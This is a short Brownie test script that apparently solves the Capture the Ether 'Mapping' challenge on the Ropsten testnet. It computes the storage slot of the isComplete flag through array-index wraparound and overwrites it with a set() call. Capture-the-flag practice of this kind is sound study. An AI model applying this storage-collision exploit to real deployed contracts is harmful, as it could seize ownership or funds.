from brownie import accounts, MappingChallenge
from web3 import Web3

challenge_address = "0x747e8d9522EEB91E0cdB5FF659558C1eAEF9b4E3"
MAX_UINT = 2 ** 256
start_of_array = Web3.toInt(Web3.solidityKeccak(["uint256"], [1]))

# --------------------------------------------------------------------------
# to beat this challenge we must change the value of the isComplete variable
# To do this we can compute the index that the isComplete variable is stored
# at in the array
# --------------------------------------------------------------------------


def test_mapping():
    # load account
    account = accounts.load("Ropsten_test_net_account")

    # get challenge contract
    challenge = MappingChallenge.at(challenge_address)

    # compute the position of the isComplete variable in the dynamic array
    owner_location = MAX_UINT - start_of_array

    # call set function to expand array and set isComplete variable to True (1)
    tx = challenge.set(owner_location, 1, {"from": account})
    tx.wait(1)

    # view the value of the isComplete variable
    print(challenge.isComplete())

    # confirm that we the level is completed
    assert challenge.isComplete()
